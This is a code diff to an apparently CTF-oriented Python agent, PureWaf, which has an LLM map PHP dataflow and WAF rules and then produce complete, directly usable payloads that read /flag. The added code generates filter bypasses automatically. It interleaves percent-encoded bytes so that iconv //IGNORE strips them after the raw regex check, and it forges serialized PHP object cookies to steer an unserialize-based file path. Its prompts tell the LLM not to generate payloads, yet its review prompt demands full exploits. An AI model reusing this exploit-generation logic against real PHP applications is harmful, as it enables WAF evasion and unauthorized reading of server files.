@@ -6,6 +6,7 @@ import shutil
 import subprocess
 import tempfile
 import time
+import urllib.parse
 import uuid
 from dataclasses import dataclass, field
 from pathlib import Path
@@ -30,7 +31,7 @@ AGENT_SECURITY_BOUNDARY = (
     "tools outside the payload validation sandbox."
 )
 ALLOWED_SINK_KINDS = {"command_exec", "file_read_path", "file_write_upload"}
-ALLOWED_PAYLOAD_CONTEXTS = {"shell_command", "php_code", "any"}
+ALLOWED_PAYLOAD_CONTEXTS = {"shell_command", "php_code", "file_path", "url_query_value", "any"}
 MIN_CONFIDENCE = 0.6
 PHP_PROJECT_EXTENSIONS = {".php", ".phtml", ".inc"}
 PROJECT_SKIP_DIRS = {".git", "__MACOSX", "node_modules", "vendor"}
@@ -212,6 +213,72 @@ class LlmWafExtraction:
     confidence: float = 0.0
 
 
+@dataclass(frozen=True)
+class AgentRoute:
+    path: str = ""
+    method: str = "GET"
+
+    def as_dict(self) -> Dict[str, str]:
+        return {
+            "path": self.path,
+            "method": self.method,
+        }
+
+
+@dataclass(frozen=True)
+class AgentInputRef:
+    source: str = ""
+    key: str = ""
+
+    def as_dict(self) -> Dict[str, str]:
+        return {
+            "source": self.source,
+            "key": self.key,
+        }
+
+
+@dataclass(frozen=True)
+class AgentDataflowStep:
+    kind: str = ""
+    code: str = ""
+    function: str = ""
+    before_transform: bool = False
+    effect: str = ""
+
+    def as_dict(self) -> Dict[str, object]:
+        return {
+            "kind": self.kind,
+            "code": self.code,
+            "function": self.function,
+            "before_transform": self.before_transform,
+            "effect": self.effect,
+        }
+
+
+@dataclass
+class AgentTransformChain:
+    route: AgentRoute = field(default_factory=AgentRoute)
+    input_ref: AgentInputRef = field(default_factory=AgentInputRef)
+    sink_kind: str = ""
+    sink_function: str = ""
+    sink_argument: str = ""
+    steps: List[AgentDataflowStep] = field(default_factory=list)
+    strategy_hints: List[str] = field(default_factory=list)
+
+    def as_dict(self) -> Dict[str, object]:
+        return {
+            "route": self.route.as_dict(),
+            "input": self.input_ref.as_dict(),
+            "sink": {
+                "kind": self.sink_kind,
+                "function": self.sink_function,
+                "argument": self.sink_argument,
+            },
+            "dataflow": [step.as_dict() for step in self.steps],
+            "strategy_hints": list(self.strategy_hints),
+        }
+
+
 @dataclass
 class LlmSinkAnalysis:
     enabled: bool = False
@@ -220,6 +287,7 @@ class LlmSinkAnalysis:
     endpoint: str = ""
     candidates: List[LlmSinkCandidate] = field(default_factory=list)
     waf_extraction: Optional[LlmWafExtraction] = None
+    transform_chain: Optional[AgentTransformChain] = None
     error: str = ""
 
 
@@ -248,6 +316,13 @@ class LlmPayloadReview:
     endpoint: str = ""
     valid: bool = False
     fallback_payload: str = ""
+    payload_value: str = ""
+    request_path: str = ""
+    request_headers: Dict[str, str] = field(default_factory=dict)
+    request_cookies: Dict[str, str] = field(default_factory=dict)
+    payload_context: str = ""
+    source: str = ""
+    evidence: str = ""
     notes: str = ""
     error: str = ""
 
@@ -325,6 +400,7 @@ class PureWafLlmSinkAgent:
             parsed = self._load_json_content(content)
             candidates = self._parse_candidates_from_parsed(parsed)
             waf_extraction = self._parse_waf_extraction(parsed)
+            transform_chain = self._parse_transform_chain(parsed)
         except Exception as exc:
             if self.session:
                 self.session.record_tool_result("llm_sink_analysis", {"error": str(exc)})
@@ -344,6 +420,7 @@ class PureWafLlmSinkAgent:
                     "candidate_count": len(candidates),
                     "candidates": [candidate.as_dict() for candidate in candidates[:3]],
                     "waf_extraction": waf_extraction is not None,
+                    "transform_chain": transform_chain.as_dict() if transform_chain else None,
                 },
             )
         return LlmSinkAnalysis(
@@ -353,6 +430,7 @@ class PureWafLlmSinkAgent:
             endpoint=endpoint,
             candidates=candidates,
             waf_extraction=waf_extraction,
+            transform_chain=transform_chain,
         )
 
     def _chat_completion(
@@ -464,10 +542,11 @@ class PureWafLlmSinkAgent:
                     "The primary CTF objective is to identify how user-controlled data can reach "
                     "a sink that may help get FLAG. "
                     "AUTO mode analyzes one PHP source file to identify the sink, input source, "
-                    "filters, and execution context, then PureWaf's local payload engine generates "
+                    "filters, transformation/dataflow chain, and execution context, then PureWaf's local payload engine generates "
                     "and filters candidates. Allowed sink kinds are only: command_exec, "
                     "file_read_path, file_write_upload. Allowed payload_context values are only: "
-                    "shell_command, php_code, any. Do not generate payloads. Do not provide exploit "
+                    "shell_command, php_code, file_path, url_query_value, any. For file_read_path "
+                    "prefer file_path unless the answer must be a raw HTTP query value. Do not generate payloads. Do not provide exploit "
                     "steps. Do not use external project knowledge or web content. If the source is "
                     "insufficient, return an empty sinks array.\n\n"
                     "In addition to sinks, you MUST also extract WAF/filter constraints from the "
@@ -479,6 +558,14 @@ class PureWafLlmSinkAgent:
                     "{\"sinks\":[{\"function\":\"name\",\"kind\":\"command_exec\","
                     "\"payload_context\":\"shell_command\",\"argument_index\":0,"
                     "\"confidence\":0.0,\"evidence\":\"short source-based reason\"}],"
+                    "\"route\":{\"path\":\"/preview.php\",\"method\":\"GET\"},"
+                    "\"input\":{\"source\":\"GET\",\"key\":\"f\"},"
+                    "\"sink\":{\"kind\":\"file_read_path\",\"function\":\"file_get_contents\","
+                    "\"argument\":\"$path\"},"
+                    "\"dataflow\":[{\"kind\":\"filter\",\"code\":\"preg_match(...)\","
+                    "\"function\":\"preg_match\",\"before_transform\":true,"
+                    "\"effect\":\"blocks raw input before conversion\"}],"
+                    "\"strategy_hints\":[\"avoid literal filtered words before transform\"],"
                     "\"waf\":{\"blocked_words\":[\"system\",\"exec\"],"
                     "\"blocked_chars\":[\" \",\";\"],"
                     "\"regex_patterns\":[\"/system|exec/i\"],"
@@ -636,6 +723,81 @@ class PureWafLlmSinkAgent:
         )
 
     @staticmethod
+    def _parse_transform_chain(parsed: Dict) -> Optional[AgentTransformChain]:
+        route_raw = parsed.get("route")
+        input_raw = parsed.get("input")
+        sink_raw = parsed.get("sink")
+        steps_raw = parsed.get("dataflow")
+        hints_raw = parsed.get("strategy_hints")
+
+        route = AgentRoute()
+        if isinstance(route_raw, dict):
+            path = _compact_text(route_raw.get("path", ""), limit=220)
+            method = _compact_text(route_raw.get("method", "GET"), limit=12).upper() or "GET"
+            route = AgentRoute(path=path, method=method)
+
+        input_ref = AgentInputRef()
+        if isinstance(input_raw, dict):
+            source = _compact_text(input_raw.get("source", ""), limit=24).upper()
+            key = _compact_text(input_raw.get("key", ""), limit=120)
+            input_ref = AgentInputRef(source=source, key=key)
+
+        sink_kind = ""
+        sink_function = ""
+        sink_argument = ""
+        if isinstance(sink_raw, dict):
+            sink_kind = _compact_text(sink_raw.get("kind", ""), limit=40)
+            sink_function = _compact_text(sink_raw.get("function", ""), limit=80)
+            sink_argument = _compact_text(
+                sink_raw.get("argument", sink_raw.get("argument_expr", "")),
+                limit=220,
+            )
+
+        steps: List[AgentDataflowStep] = []
+        if isinstance(steps_raw, list):
+            for item in steps_raw[:16]:
+                if not isinstance(item, dict):
+                    continue
+                steps.append(
+                    AgentDataflowStep(
+                        kind=_compact_text(item.get("kind", ""), limit=40),
+                        code=_compact_text(item.get("code", ""), limit=240),
+                        function=_compact_text(item.get("function", ""), limit=80),
+                        before_transform=bool(item.get("before_transform", False)),
+                        effect=_compact_text(item.get("effect", ""), limit=240),
+                    )
+                )
+
+        hints = [
+            _compact_text(item, limit=160)
+            for item in (hints_raw if isinstance(hints_raw, list) else [])
+            if str(item or "").strip()
+        ][:12]
+
+        if not any(
+            [
+                route.path,
+                input_ref.key,
+                sink_kind,
+                sink_function,
+                sink_argument,
+                steps,
+                hints,
+            ]
+        ):
+            return None
+
+        return AgentTransformChain(
+            route=route,
+            input_ref=input_ref,
+            sink_kind=sink_kind,
+            sink_function=sink_function,
+            sink_argument=sink_argument,
+            steps=steps,
+            strategy_hints=hints,
+        )
+
+    @staticmethod
     def _load_json_content(content: str) -> Dict[str, object]:
         text = (content or "").strip()
         if text.startswith("```"):
@@ -667,6 +829,8 @@ class PureWafLlmSinkAgent:
             return None
         if kind not in ALLOWED_SINK_KINDS:
             return None
+        if kind == "file_read_path" and payload_context == "any":
+            payload_context = "file_path"
         if payload_context not in ALLOWED_PAYLOAD_CONTEXTS:
             return None
 
@@ -827,9 +991,14 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
                 self.session.record_tool_result("llm_project_selection", {"error": str(exc)})
             return [], f"LLM project selection invalid: {exc}"
         if self.session:
+            transform_chain = self._parse_transform_chain(parsed)
             self.session.record_tool_result(
                 "llm_project_selection",
-                {"selected_files": selected[:12], "available_files": len(files)},
+                {
+                    "selected_files": selected[:12],
+                    "available_files": len(files),
+                    "transform_chain": transform_chain.as_dict() if transform_chain else None,
+                },
             )
         return selected, ""
 
@@ -843,6 +1012,7 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
             return None
         candidates = self._parse_candidates_from_parsed(parsed)
         waf_extraction = self._parse_waf_extraction(parsed)
+        transform_chain = self._parse_transform_chain(parsed)
         if not candidates:
             return None
         settings, _ = self._load_settings()
@@ -854,6 +1024,7 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
             endpoint="",
             candidates=candidates,
             waf_extraction=waf_extraction,
+            transform_chain=transform_chain,
         )
 
     def build_project_selection_messages(
@@ -882,9 +1053,23 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
                     "dangerous sink reachability.\n"
                     "2. From the excerpts, identify sinks and WAF constraints if visible.\n\n"
                     "Allowed sink kinds: command_exec, file_read_path, file_write_upload. "
-                    "Allowed payload_context values: shell_command, php_code, any.\n\n"
+                    "Allowed payload_context values: shell_command, php_code, file_path, "
+                    "url_query_value, any. For file_read_path prefer file_path unless the "
+                    "complete exploit must be an HTTP query value.\n\n"
+                    "Also preserve project semantics: identify the route/path, the input "
+                    "source/key, whether filters run before transforms, and any conversion "
+                    "chain that changes the value before the sink. Do not collapse this into "
+                    "only sink_kind plus WAF words.\n\n"
                     "Return only JSON shaped as:\n"
                     "{\"selected_files\":[\"relative/path.php\"],\"reason\":\"short reason\","
+                    "\"route\":{\"path\":\"/preview.php\",\"method\":\"GET\"},"
+                    "\"input\":{\"source\":\"GET\",\"key\":\"f\"},"
+                    "\"sink\":{\"kind\":\"file_read_path\",\"function\":\"file_get_contents\","
+                    "\"argument\":\"$convertedPath\"},"
+                    "\"dataflow\":[{\"kind\":\"filter\",\"code\":\"preg_match(...)\","
+                    "\"function\":\"preg_match\",\"before_transform\":true,"
+                    "\"effect\":\"raw input is checked before path conversion\"}],"
+                    "\"strategy_hints\":[\"target the value after conversion\"],"
                     "\"sinks\":[{\"function\":\"name\",\"kind\":\"command_exec\","
                     "\"payload_context\":\"shell_command\",\"argument_index\":0,"
                     "\"confidence\":0.0,\"evidence\":\"short reason\"}],"
@@ -947,6 +1132,10 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
         flag_payloads: Optional[Sequence[str]] = None,
         validation_results: Optional[Sequence[PayloadValidationResult]] = None,
         waf_extraction: Optional[LlmWafExtraction] = None,
+        transform_chain: Optional[object] = None,
+        sink_kind: str = "",
+        payload_context: str = "any",
+        flagfile: str = "/flag",
     ) -> LlmPayloadReview:
         settings, error = self._load_settings()
         if error:
@@ -965,6 +1154,7 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
                 flag_payloads=flag_payloads or [],
                 validation_results=validation_results or [],
                 waf_extraction=waf_extraction,
+                transform_chain=transform_chain,
             ),
             max_tokens=1000,
         )
@@ -989,6 +1179,38 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
                 endpoint=endpoint,
                 error=f"LLM payload review invalid: {exc}",
             )
+        validation_error = self._payload_review_validation_error(review)
+        if validation_error:
+            if self.session:
+                self.session.record_tool_result(
+                    "llm_payload_review",
+                    {"error": validation_error, "valid": review.valid},
+                )
+            return LlmPayloadReview(
+                used=True,
+                model=settings.model,
+                endpoint=endpoint,
+                valid=review.valid,
+                fallback_payload=review.fallback_payload,
+                payload_value=review.payload_value,
+                request_path=review.request_path,
+                payload_context=review.payload_context,
+                request_headers=dict(review.request_headers),
+                request_cookies=dict(review.request_cookies),
+                source=review.source,
+                evidence=review.evidence,
+                notes=review.notes,
+                error=f"LLM payload review invalid: {validation_error}",
+            )
+        review = self._finalize_payload_review(
+            review=review,
+            source=source,
+            sink_kind=sink_kind,
+            payload_context=payload_context,
+            flagfile=flagfile,
+            transform_chain=transform_chain,
+            waf_extraction=waf_extraction,
+        )
         review.used = True
         review.model = settings.model
         review.endpoint = endpoint
@@ -998,7 +1220,14 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
                 {
                     "valid": review.valid,
                     "has_fallback": bool(review.fallback_payload),
+                    "payload_value": review.payload_value,
+                    "request_path": review.request_path,
+                    "request_headers": review.request_headers,
+                    "request_cookies": review.request_cookies,
+                    "source": review.source,
+                    "evidence": review.evidence,
                     "notes": review.notes,
+                    "error": review.error,
                 },
             )
         return review
@@ -1013,6 +1242,7 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
         flag_payloads: Sequence[str],
         validation_results: Sequence[PayloadValidationResult] = (),
         waf_extraction: Optional[LlmWafExtraction] = None,
+        transform_chain: Optional[object] = None,
     ) -> List[Dict[str, str]]:
         final_payload = shortest_flag if shortest_flag and shortest_flag != "N/A" else ""
         payload_summary = {
@@ -1024,6 +1254,13 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
             "analysis_lines": list(analysis_lines[-20:]),
             "validation_results": [item.as_dict() for item in list(validation_results)[:8]],
         }
+        fallback_required, fallback_reason = self._review_fallback_requirement(
+            shortest_flag=shortest_flag,
+            flag_payloads=flag_payloads,
+            validation_results=validation_results,
+        )
+        payload_summary["fallback_required"] = fallback_required
+        payload_summary["fallback_reason"] = fallback_reason
         if waf_extraction is not None:
             payload_summary["llm_waf_extraction"] = {
                 "blocked_words": waf_extraction.waf_words,
@@ -1031,12 +1268,18 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
                 "regex_patterns": waf_extraction.waf_regex,
                 "length_limit": waf_extraction.limit_length,
             }
+        if transform_chain:
+            if hasattr(transform_chain, "as_dict"):
+                payload_summary["transform_chain"] = transform_chain.as_dict()
+            elif isinstance(transform_chain, dict):
+                payload_summary["transform_chain"] = transform_chain
         waf_constraint_instruction = ""
         if waf_extraction is not None:
             waf_constraint_instruction = (
                 " The fallback_payload MUST NOT contain any blocked words, characters, "
-                "or match regex patterns listed in the llm_waf_extraction field of the "
-                "PureWaf output summary."
+                "or match regex patterns listed in the llm_waf_extraction field as the "
+                "PHP source sees the value at the filter point. For URL query values, "
+                "judge this after HTTP percent-decoding, not from the printed URL alone."
             )
         return [
             {
@@ -1054,11 +1297,36 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
                     "a usable /flag payload, set valid=true and leave fallback_payload empty. If "
                     "PureWaf produced no usable /flag payload, or the provided payload does not fit "
                     "the detected sink/filter context, set valid=false and provide exactly one "
-                    "fallback_payload that attempts to read /flag through the detected sink."
+                    "payload_value/fallback_payload that reads /flag through the detected sink. When "
+                    "fallback_required is true in the PureWaf output summary, fallback_payload is "
+                    "mandatory and must be non-empty. The payload_value must be the complete, "
+                    "directly usable exploit input value for the vulnerable parameter. If the "
+                    "input is an HTTP query parameter, payload_value should be the exact query "
+                    "value bytes expressed as URL-safe text; do not replace a byte-level payload "
+                    "with its decoded Unicode display form. If route "
+                    "and input key are known, also return request_path as the complete path and "
+                    "query string, for example /preview.php?f=value. It must not be a "
+                    "fragment, placeholder, pseudocode, explanation, or post-processing step. For "
+                    "shell_command sinks, return the full shell command value. For php_code sinks, "
+                    "return the full PHP code snippet. For file_read_path sinks, return the exact "
+                    "path, stream-wrapper resource value, or route query value that the source "
+                    "dataflow proves will become the sink path. If source shows iconv or "
+                    "mb_convert_encoding with //IGNORE after a raw WAF check, reason at byte "
+                    "level: a valid fallback may need non-ASCII/invalid bytes interleaved between "
+                    "ASCII target path letters so the raw WAF does not see a blocked word but the "
+                    "conversion drops those bytes before file_get_contents. If source shows "
+                    "required request state such as a Cookie-controlled object/property, include "
+                    "complete request_cookies or request_headers; otherwise the final request is "
+                    "not directly usable."
                     f"{waf_constraint_instruction}"
                     " Do not "
                     "give exploitation steps or prose outside JSON. Return only JSON shaped as "
-                    "{\"valid\":true,\"fallback_payload\":\"\",\"notes\":\"short source-based note\"}."
+                    "{\"valid\":true,\"payload_value\":\"\",\"request_path\":\"\","
+                    "\"request_headers\":{\"Cookie\":\"name=value\"},"
+                    "\"request_cookies\":{\"name\":\"value\"},"
+                    "\"payload_context\":\"file_path\",\"source\":\"purewaf\","
+                    "\"fallback_payload\":\"\",\"evidence\":\"short source-based proof\","
+                    "\"notes\":\"short source-based note\"}."
                 ),
             },
             {
@@ -1072,12 +1340,390 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
             },
         ]
 
+    @staticmethod
+    def _review_fallback_requirement(
+        shortest_flag: str,
+        flag_payloads: Sequence[str],
+        validation_results: Sequence[PayloadValidationResult],
+    ) -> Tuple[bool, str]:
+        flag_candidates = [
+            str(payload or "").strip()
+            for payload in [shortest_flag, *list(flag_payloads or [])]
+            if str(payload or "").strip() and str(payload or "").strip() != "N/A"
+        ]
+        if not flag_candidates:
+            return True, "PureWaf did not produce a /flag payload"
+
+        attempted_results = [
+            item
+            for item in validation_results
+            if getattr(item, "attempted", False) and not getattr(item, "skipped", False)
+        ]
+        if attempted_results and not any(getattr(item, "passed", False) for item in attempted_results):
+            return True, "PHP CLI sandbox validation did not confirm any PureWaf /flag payload"
+
+        return False, ""
+
+    @staticmethod
+    def _payload_review_validation_error(review: LlmPayloadReview) -> str:
+        candidate = review.payload_value or review.fallback_payload or review.request_path
+        if not review.valid and not candidate:
+            return "fallback_payload is required when valid=false"
+        if candidate and PureWafProjectAgent._fallback_payload_looks_incomplete(candidate):
+            return "fallback_payload must be a complete directly usable payload"
+        return ""
+
+    def _finalize_payload_review(
+        self,
+        review: LlmPayloadReview,
+        source: str,
+        sink_kind: str,
+        payload_context: str,
+        flagfile: str,
+        transform_chain: Optional[object],
+        waf_extraction: Optional[LlmWafExtraction],
+    ) -> LlmPayloadReview:
+        if not review.payload_context:
+            review.payload_context = payload_context or ""
+
+        candidate = self._review_payload_value_for_validation(review, transform_chain)
+        if sink_kind == "file_read_path" and transform_chain and candidate:
+            validation_context = review.payload_context or payload_context or "any"
+            validation_results = self.validate_payloads(
+                [candidate],
+                sink_kind=sink_kind,
+                payload_context=validation_context,
+                flagfile=flagfile,
+                transform_chain=transform_chain,
+                waf_extraction=waf_extraction,
+            )
+            if validation_results and not any(item.passed for item in validation_results):
+                repaired = self._repair_iconv_ignore_review_payload(
+                    review=review,
+                    source=source,
+                    flagfile=flagfile,
+                    transform_chain=transform_chain,
+                    waf_extraction=waf_extraction,
+                    payload_context=payload_context,
+                )
+                if repaired is not None:
+                    review = repaired
+                    validation_context = review.payload_context or payload_context or "any"
+                    repaired_candidate = self._review_payload_value_for_validation(
+                        review,
+                        transform_chain,
+                    )
+                    validation_results = self.validate_payloads(
+                        [repaired_candidate],
+                        sink_kind=sink_kind,
+                        payload_context=validation_context,
+                        flagfile=flagfile,
+                        transform_chain=transform_chain,
+                        waf_extraction=waf_extraction,
+                    )
+                if validation_results and not any(item.passed for item in validation_results):
+                    first = validation_results[0]
+                    review.error = (
+                        "LLM fallback payload failed dataflow validation: "
+                        f"{first.reason}"
+                    )
+
+        self._ensure_review_request_state(review, source, transform_chain)
+        return review
+
+    @staticmethod
+    def _review_payload_value_for_validation(
+        review: LlmPayloadReview,
+        transform_chain: Optional[object],
+    ) -> str:
+        request_value = PureWafProjectAgent._extract_request_query_value(
+            review.request_path,
+            transform_chain,
+        )
+        if request_value:
+            return request_value
+        return review.payload_value or review.fallback_payload or review.request_path
+
+    @staticmethod
+    def _extract_request_query_value(request_path: str, transform_chain: Optional[object]) -> str:
+        text = str(request_path or "").strip()
+        if "?" not in text:
+            return ""
+        query = text.split("?", 1)[1].split("#", 1)[0]
+        if not query:
+            return ""
+
+        key = ""
+        chain = PureWafProjectAgent._coerce_transform_chain_dict(transform_chain)
+        input_ref = chain.get("input")
+        if isinstance(input_ref, dict):
+            key = str(input_ref.get("key", "") or "").strip()
+
+        pairs = [part for part in query.split("&") if part]
+        fallback_value = ""
+        for part in pairs:
+            raw_key, sep, raw_value = part.partition("=")
+            if not sep:
+                raw_value = ""
+            if not fallback_value:
+                fallback_value = raw_value
+            if key and urllib.parse.unquote_plus(raw_key) == key:
+                return raw_value
+        if not key and len(pairs) == 1:
+            return fallback_value
+        return ""
+
+    def _repair_iconv_ignore_review_payload(
+        self,
+        review: LlmPayloadReview,
+        source: str,
+        flagfile: str,
+        transform_chain: Optional[object],
+        waf_extraction: Optional[LlmWafExtraction],
+        payload_context: str,
+    ) -> Optional[LlmPayloadReview]:
+        chain = self._coerce_transform_chain_dict(transform_chain)
+        chain_text = self._transform_chain_text(chain)
+        combined = f"{source}\n{chain_text}".lower()
+        if "iconv" not in combined and "mb_convert_encoding" not in combined:
+            return None
+        if "ignore" not in combined:
+            return None
+        if "preg_match" not in combined and "filter" not in chain_text.lower():
+            return None
+
+        target_leaf = (flagfile or "/flag").replace("\\", "/").strip("/") or "flag"
+        target_leaf = target_leaf.rsplit("/", 1)[-1] or "flag"
+        if not re.fullmatch(r"[A-Za-z0-9._-]+", target_leaf):
+            return None
+
+        payload_value = self._build_iconv_ignore_interleaved_ascii_payload(target_leaf)
+        validation_context = "url_query_value" if self._chain_has_route_input(chain) else (
+            payload_context or review.payload_context or "file_path"
+        )
+        if waf_extraction is not None:
+            allowed, _reason = self._dataflow_waf_allows(
+                payload_value,
+                validation_context,
+                waf_extraction,
+            )
+            if not allowed:
+                return None
+
+        repaired = LlmPayloadReview(
+            used=review.used,
+            model=review.model,
+            endpoint=review.endpoint,
+            valid=False,
+            fallback_payload=payload_value,
+            payload_value=payload_value,
+            request_path=self._build_request_path_for_payload(payload_value, chain, review),
+            request_headers=dict(review.request_headers),
+            request_cookies=dict(review.request_cookies),
+            payload_context=validation_context,
+            source="agent_dataflow_repair",
+            evidence=(
+                "review fallback failed byte-level dataflow validation; generated an "
+                "iconv //IGNORE byte-interleaved query value that avoids the raw filter "
+                f"and converts to {target_leaf} before file_get_contents"
+            ),
+            notes=self._append_note(
+                review.notes,
+                "agent repaired fallback after dataflow validation rejected the LLM value",
+            ),
+        )
+        self._ensure_review_request_state(repaired, source, transform_chain)
+        return repaired
+
+    @staticmethod
+    def _chain_has_route_input(chain: Dict[str, object]) -> bool:
+        route = chain.get("route")
+        input_ref = chain.get("input")
+        return (
+            isinstance(route, dict)
+            and bool(str(route.get("path", "") or "").strip())
+            and isinstance(input_ref, dict)
+            and bool(str(input_ref.get("key", "") or "").strip())
+        )
+
+    @staticmethod
+    def _build_request_path_for_payload(
+        payload_value: str,
+        chain: Dict[str, object],
+        review: LlmPayloadReview,
+    ) -> str:
+        if review.request_path and "?" in review.request_path:
+            key = ""
+            input_ref = chain.get("input")
+            if isinstance(input_ref, dict):
+                key = str(input_ref.get("key", "") or "").strip()
+            path = review.request_path.split("?", 1)[0] or ""
+            if key:
+                return f"{path}?{urllib.parse.quote_plus(key)}={payload_value}"
+        route = chain.get("route")
+        input_ref = chain.get("input")
+        if not isinstance(route, dict) or not isinstance(input_ref, dict):
+            return review.request_path
+        path = str(route.get("path", "") or "").strip()
+        key = str(input_ref.get("key", "") or "").strip()
+        if not path or not key:
+            return review.request_path
+        return f"{path}?{urllib.parse.quote_plus(key)}={payload_value}"
+
+    @staticmethod
+    def _build_iconv_ignore_interleaved_ascii_payload(text: str) -> str:
+        noise = [0xE4, 0xB8, 0xAF, 0xE6, 0x9C, 0x87]
+        chars = list(text)
+        if not chars:
+            return ""
+        counts = [1 for _ in chars]
+        extra = max(0, len(noise) - len(chars))
+        for idx in range(max(0, len(chars) - extra), len(chars)):
+            counts[idx] += 1
+        out: List[str] = []
+        noise_idx = 0
+        for idx, ch in enumerate(chars):
+            for _ in range(counts[idx]):
+                byte = noise[noise_idx % len(noise)]
+                out.append(f"%{byte:02X}")
+                noise_idx += 1
+            if re.fullmatch(r"[A-Za-z0-9._~-]", ch):
+                out.append(ch)
+            else:
+                out.append(urllib.parse.quote(ch, safe=""))
+        return "".join(out)
+
+    def _ensure_review_request_state(
+        self,
+        review: LlmPayloadReview,
+        source: str,
+        transform_chain: Optional[object],
+    ):
+        spec = self._serialized_user_cookie_spec(source, transform_chain)
+        if spec is None:
+            return
+        cookie_name, cookie_value = spec
+        if not cookie_name or not cookie_value:
+            return
+        if cookie_name not in review.request_cookies:
+            review.request_cookies[cookie_name] = cookie_value
+        self._ensure_cookie_header(review)
+        review.notes = self._append_note(
+            review.notes,
+            f"requires Cookie {cookie_name} with basePath=/ and encoding=ISO-2022-CN-EXT",
+        )
+
+    @staticmethod
+    def _serialized_user_cookie_spec(
+        source: str,
+        transform_chain: Optional[object],
+    ) -> Optional[Tuple[str, str]]:
+        text = source or ""
+        lowered = text.lower()
+        if "unserialize" not in lowered or "$_cookie" not in lowered:
+            return None
+        if "basepath" not in lowered or "encoding" not in lowered:
+            return None
+        chain_text = PureWafProjectAgent._transform_chain_text(
+            PureWafProjectAgent._coerce_transform_chain_dict(transform_chain)
+        )
+        if "iconv" not in f"{lowered}\n{chain_text.lower()}":
+            return None
+
+        cookie_match = re.search(r"\$_COOKIE\s*\[\s*['\"]([^'\"]+)['\"]\s*\]", text)
+        cookie_name = cookie_match.group(1) if cookie_match else "user"
+        class_match = re.search(r"\bclass\s+([A-Za-z_]\w*)", text)
+        class_name = class_match.group(1) if class_match else "User"
+
+        props = re.findall(
+            r"\bpublic\s+(?:\??[A-Za-z_\\][\w\\]*\s+)?\$([A-Za-z_]\w*)",
+            text,
+        )
+        preferred = [
+            ("name", "guest"),
+            ("encoding", "ISO-2022-CN-EXT"),
+            ("basePath", "/"),
+        ]
+        if props:
+            prop_set = set(props)
+            values = [(name, value) for name, value in preferred if name in prop_set]
+        else:
+            values = preferred
+        if not any(name == "encoding" for name, _value in values):
+            values.append(("encoding", "ISO-2022-CN-EXT"))
+        if not any(name == "basePath" for name, _value in values):
+            values.append(("basePath", "/"))
+        serialized = PureWafProjectAgent._serialize_public_php_object(class_name, values)
+        return cookie_name, urllib.parse.quote(serialized, safe="")
+
+    @staticmethod
+    def _serialize_public_php_object(class_name: str, values: Sequence[Tuple[str, str]]) -> str:
+        def php_string(value: str) -> str:
+            text = str(value)
+            return f's:{len(text.encode("utf-8"))}:"{text}";'
+
+        fields = "".join(php_string(name) + php_string(value) for name, value in values)
+        return f'O:{len(class_name.encode("utf-8"))}:"{class_name}":{len(values)}:{{{fields}}}'
+
+    @staticmethod
+    def _ensure_cookie_header(review: LlmPayloadReview):
+        if not review.request_cookies:
+            return
+        cookie_header = "; ".join(
+            f"{name}={value}" for name, value in review.request_cookies.items()
+        )
+        existing_key = ""
+        for key in review.request_headers:
+            if key.lower() == "cookie":
+                existing_key = key
+                break
+        if existing_key:
+            existing = review.request_headers.get(existing_key, "")
+            for name, value in review.request_cookies.items():
+                if f"{name}=" not in existing:
+                    existing = (existing.rstrip("; ") + "; " if existing else "") + f"{name}={value}"
+            review.request_headers[existing_key] = existing
+        else:
+            review.request_headers["Cookie"] = cookie_header
+
+    @staticmethod
+    def _append_note(existing: str, note: str) -> str:
+        existing = str(existing or "").strip()
+        note = str(note or "").strip()
+        if not note or note.lower() in existing.lower():
+            return existing
+        return (existing + "; " + note).strip("; ") if existing else note
+
+    @staticmethod
+    def _fallback_payload_looks_incomplete(payload: str) -> bool:
+        text = str(payload or "").strip()
+        if not text:
+            return True
+        lowered = text.lower()
+        incomplete_markers = (
+            "<payload>",
+            "<command>",
+            "<cmd>",
+            "{{payload}}",
+            "{{command}}",
+            "replace_me",
+            "your_payload",
+            "your command",
+            "todo",
+            "...",
+        )
+        if any(marker in lowered for marker in incomplete_markers):
+            return True
+        return bool(re.match(r"^(try|use|run|execute)\s+", lowered))
+
     def validate_payloads(
         self,
         payloads: Sequence[str],
         sink_kind: str = "",
         payload_context: str = "any",
         flagfile: str = "/flag",
+        transform_chain: Optional[object] = None,
+        waf_extraction: Optional[LlmWafExtraction] = None,
     ) -> List[PayloadValidationResult]:
         candidates = [
             str(payload or "").strip()
@@ -1092,6 +1738,7 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
                     "candidate_count": len(candidates),
                     "sink_kind": sink_kind,
                     "payload_context": payload_context,
+                    "dataflow_validation": bool(transform_chain),
                     "network_php_allowed": True,
                 },
             )
@@ -1106,6 +1753,18 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
             )
             self._record_validation_results([result])
             return [result]
+
+        dataflow_results = self._validate_dataflow_payloads(
+            candidates,
+            sink_kind=sink_kind,
+            payload_context=payload_context,
+            flagfile=flagfile,
+            transform_chain=transform_chain,
+            waf_extraction=waf_extraction,
+        )
+        if dataflow_results and any(not item.skipped for item in dataflow_results):
+            self._record_validation_results(dataflow_results)
+            return dataflow_results
 
         php_bin = shutil.which("php")
         if not php_bin:
@@ -1144,6 +1803,329 @@ class PureWafProjectAgent(PureWafLlmSinkAgent):
 
         self._record_validation_results(results)
         return results
+
+    def _validate_dataflow_payloads(
+        self,
+        payloads: Sequence[str],
+        sink_kind: str,
+        payload_context: str,
+        flagfile: str,
+        transform_chain: Optional[object],
+        waf_extraction: Optional[LlmWafExtraction],
+    ) -> List[PayloadValidationResult]:
+        chain = self._coerce_transform_chain_dict(transform_chain)
+        if not chain or sink_kind != "file_read_path":
+            return []
+
+        results = []
+        for payload in payloads:
+            results.append(
+                self._validate_one_dataflow_payload(
+                    payload=payload,
+                    sink_kind=sink_kind,
+                    payload_context=payload_context,
+                    flagfile=flagfile,
+                    chain=chain,
+                    waf_extraction=waf_extraction,
+                )
